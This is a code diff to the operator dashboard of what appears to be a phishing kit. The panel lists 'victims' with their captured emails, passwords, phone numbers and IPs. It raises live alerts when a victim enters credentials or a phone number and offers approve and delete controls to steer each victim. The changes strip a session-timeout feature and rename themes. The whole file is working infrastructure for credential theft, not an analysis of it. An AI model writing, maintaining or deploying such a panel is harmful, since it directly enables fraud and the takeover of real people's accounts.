@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -370,7 +371,6 @@
     .alert-warning{border-left:3px solid var(--yellow)}.alert-warning .alert-icon{background:rgba(251,191,36,.12);color:var(--yellow)}
     .alert-info{border-left:3px solid var(--blue)}.alert-info .alert-icon{background:rgba(96,165,250,.12);color:var(--blue)}
     .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.12);color:var(--red)}
-    .alert-timeout{border-left:3px solid #9ca3af}.alert-timeout .alert-icon{background:rgba(156,163,175,.12);color:#9ca3af}
     @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
     @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
     
@@ -379,8 +379,6 @@
     
     tr.approved{opacity:.6;background:rgba(52,211,153,.03)}
     tr.approved td{color:var(--text-muted)}
-    tr.timed-out{opacity:.4;background:rgba(156,163,175,.05)}
-    tr.timed-out td{color:var(--text-muted);text-decoration:line-through}
 
     /* Settings styles */
     .settings-row{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--card-border)}
@@ -582,9 +580,9 @@
             <button class="theme-option" id="themeLight" onclick="setTheme('light')">Light</button>
           </div>
           <div class="theme-grid" id="themeGrid">
-            <div class="theme-thumb" data-theme="theme1" data-name="Ocean" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
-            <div class="theme-thumb" data-theme="theme2" data-name="Deep" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
-            <div class="theme-thumb" data-theme="theme3" data-name="Forest" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme1" data-name="Aurora" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme2" data-name="Forest" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
+            <div class="theme-thumb" data-theme="theme3" data-name="Ocean" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
             <div class="theme-thumb" data-theme="theme4" data-name="Dream" onclick="setTheme('theme4')" style="background-image:url('/images/theme4.jpg')"></div>
           </div>
         </div>
@@ -623,11 +621,6 @@
     const qsa = s => document.querySelectorAll(s);
     const fmt = t => new Date(t).toLocaleTimeString();
     const fmtDate = t => new Date(t).toLocaleString();
-    
-    // Session timeout tracking (3 minutes = 180 seconds = 180000ms)
-    const SESSION_TIMEOUT = 180000;
-    const sessionLastActivity = new Map();
-    const timedOutSessions = new Set();
 
     /* ----------  THEME  ---------- */
     function loadTheme() {
@@ -636,22 +629,27 @@
     }
     
     function setTheme(theme, save = true) {
+      // Remove all theme attributes first
       document.documentElement.removeAttribute('data-theme');
       
+      // Set new theme
       if (theme !== 'dark' && theme !== 'light') {
         document.documentElement.setAttribute('data-theme', theme);
       } else {
         document.documentElement.setAttribute('data-theme', theme);
       }
       
+      // Update UI toggles
       qsa('.theme-option').forEach(el => el.classList.remove('active'));
       const themeBtn = qs(`#theme${theme.charAt(0).toUpperCase() + theme.slice(1)}`);
       if (themeBtn) themeBtn.classList.add('active');
       
+      // Update background layers
       qsa('.bg-layer').forEach((el, i) => {
         el.classList.toggle('active', el.id === `bg${theme.replace('theme', '')}`);
       });
       
+      // Update theme grid selection
       qsa('.theme-thumb').forEach(el => {
         el.classList.toggle('active', el.dataset.theme === theme);
       });
@@ -674,74 +672,19 @@
       const alert = document.createElement('div');
       alert.className = `alert alert-${type}`;
       alert.innerHTML = `
-        <div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕',timeout:'⏱'}[type]}</div>
+        <div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕'}[type]}</div>
         <div class="alert-content">
           <div class="alert-title">${title}</div>
           <div class="alert-desc">${desc}</div>
-          ${victimNum ? `<div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div>` : ''}
+          <div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div>
         </div>`;
       alert.onclick = () => alert.remove();
       container.appendChild(alert);
       setTimeout(() => alert.remove(), 5000);
     }
 
-    /* ----------  SESSION TIMEOUT  ---------- */
-    function updateSessionActivity(sessions) {
-      const now = Date.now();
-      
-      sessions.forEach(s => {
-        if (isApproved(s) || timedOutSessions.has(s.sid)) return;
-        
-        // Update last activity time
-        sessionLastActivity.set(s.sid, now);
-      });
-    }
-    
-    function checkSessionTimeouts() {
-      const now = Date.now();
-      let timeoutsOccurred = false;
-      
-      sessionLastActivity.forEach((lastTime, sid) => {
-        if (timedOutSessions.has(sid)) return;
-        
-        const elapsed = now - lastTime;
-        if (elapsed >= SESSION_TIMEOUT) {
-          // Session timed out
-          timedOutSessions.add(sid);
-          
-          // Find victim number for alert
-          const session = jsonData.sessions.find(s => s.sid === sid);
-          if (session && !isApproved(session)) {
-            const victimNum = session.victimNum;
-            showAlert('timeout', `SESSION #${victimNum} TIMEOUT`, 'No activity for 3 minutes', null);
-            timeoutsOccurred = true;
-            
-            // Auto-delete from server
-            fetch('/api/panel', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({action: 'delete', sid: sid})
-            });
-          }
-        }
-      });
-      
-      // Clean up old entries
-      for (const sid of sessionLastActivity.keys()) {
-        if (!jsonData.sessions.find(s => s.sid === sid)) {
-          sessionLastActivity.delete(sid);
-          timedOutSessions.delete(sid);
-        }
-      }
-      
-      if (timeoutsOccurred) {
-        load(); // Refresh to update UI
-      }
-    }
-
     /* ----------  STATUS  ---------- */
     function statusText(s){
-      if (timedOutSessions.has(s.sid)) return '<div style="font-size:11px;color:#9ca3af">TIMED OUT</div>';
       if (s.page==='success' || s.status==='approved') return '';
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
       if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
@@ -752,10 +695,6 @@
 
     /* ----------  ACTIONS  ---------- */
     function actionButtons(s){
-      if (timedOutSessions.has(s.sid)) {
-        return '<div style="display:flex;gap:6px"><span style="font-size:11px;color:#9ca3af;padding:8px 0;">Expired</span></div>';
-      }
-      
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
@@ -778,12 +717,6 @@
     function checkChanges(newSessions){
       if (isFirstLoad) {
         lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
-        // Initialize activity tracking for existing sessions
-        newSessions.forEach(s => {
-          if (!isApproved(s)) {
-            sessionLastActivity.set(s.sid, Date.now());
-          }
-        });
         isFirstLoad = false;
         return;
       }
@@ -792,14 +725,8 @@
         const old = lastSessions.get(s.sid);
         if (!old) {
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
-          sessionLastActivity.set(s.sid, Date.now());
           if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
         } else {
-          // Update activity timestamp on any change
-          if (JSON.stringify(old) !== JSON.stringify(s)) {
-            sessionLastActivity.set(s.sid, Date.now());
-          }
-          
           if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
           if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
           if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
@@ -839,7 +766,7 @@
       qs('#statTotal').textContent = d.totalVictims;
       qs('#statSuccess').textContent = d.success;
 
-      const activeSessions = d.sessions.filter(s => !isApproved(s) && !timedOutSessions.has(s.sid));
+      const activeSessions = d.sessions.filter(s => !isApproved(s));
       qs('#active').textContent = activeSessions.length;
 
       const body = qs('#tbl tbody');
@@ -850,9 +777,8 @@
       
       body.innerHTML = d.sessions.map(s => {
         const approved = isApproved(s);
-        const timedOut = timedOutSessions.has(s.sid);
         return `
-        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''} ${timedOut ? 'timed-out' : ''}">
+        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
@@ -861,7 +787,7 @@
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
-          <td><div style="font-weight:600;color:${approved?'var(--green)':timedOut?'#9ca3af':''}">${timedOut ? 'TIMEOUT' : pageTitle(s.page)}</div>${statusText(s)}</td>
+          <td><div style="font-weight:600;color:${approved?'var(--green)':''}">${pageTitle(s.page)}</div>${statusText(s)}</td>
           <td>${actionButtons(s)}</td>
         </tr>`;
       }).join('');
@@ -879,9 +805,8 @@
       if(!s)return;
       currentSid = sid;
       const approved = isApproved(s);
-      const timedOut = timedOutSessions.has(sid);
       
-      qs('#modalTitle').textContent = `Victim #${s.victimNum}${approved ? ' (APPROVED)' : timedOut ? ' (TIMED OUT)' : ''}`;
+      qs('#modalTitle').textContent = `Victim #${s.victimNum}${approved ? ' (APPROVED)' : ''}`;
       qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
       
       const activityHtml = s.activityLog && s.activityLog.length ? 
@@ -903,7 +828,7 @@
           </div>
           <div class="info-section">
             <div class="info-label">Current Page</div>
-            <div class="info-value" style="color:${approved?'var(--green)':timedOut?'#9ca3af':'var(--blue)'}">${timedOut ? 'TIMEOUT' : pageTitle(s.page)}${approved ? ' ✓' : ''}</div>
+            <div class="info-value" style="color:${approved?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}${approved ? ' ✓' : ''}</div>
           </div>
           <div class="info-section">
             <div class="info-label">Client Number</div>
@@ -947,12 +872,12 @@
           <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
           <div class="activity-log">${activityHtml}</div>
         </div>
-        ${!approved && !timedOut ? `
+        ${!approved ? `
         <div class="delete-section">
           <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
         </div>
-        ` : timedOut ? '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:#9ca3af;font-size:13px;text-align:center;">⏱ This session timed out due to inactivity</div>' : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}`;
+        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}`;
       
       qs('#modal').style.display='flex';
     }
@@ -983,8 +908,6 @@
     async function executeDelete() {
       await fetch('/api/refresh', {method: 'POST'});
       lastSessions.clear();
-      sessionLastActivity.clear();
-      timedOutSessions.clear();
       isFirstLoad = true;
       closeConfirm();
       load();
@@ -1006,8 +929,6 @@
     /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       lastSessions.clear();
-      sessionLastActivity.clear();
-      timedOutSessions.clear();
       isFirstLoad = true;
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
@@ -1021,14 +942,9 @@
       if(d.error)return location.replace('/panel');
       jsonData = d;
       checkChanges(d.sessions);
-      updateSessionActivity(d.sessions);
-      checkSessionTimeouts();
       render(d);
       setTimeout(load,300);
     }
-    
-    // Check for timeouts every 10 seconds
-    setInterval(checkSessionTimeouts, 10000);
     
     loadTheme();
     load();
